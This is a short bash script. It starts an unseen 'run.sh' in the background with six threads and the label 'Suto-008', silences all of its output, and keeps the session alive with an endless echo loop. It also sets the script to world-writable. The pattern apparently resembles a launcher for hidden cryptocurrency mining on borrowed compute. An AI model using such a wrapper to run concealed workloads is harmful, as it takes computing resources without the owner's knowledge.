#!/bin/bash

cd app && chmod 777 run.sh && nproc --all && ./run.sh 6 Suto-008 >/dev/null 2>&1 &
sleep 10
while true
do
        echo "...ojo lali ngopi boss..."
        sleep 60
done
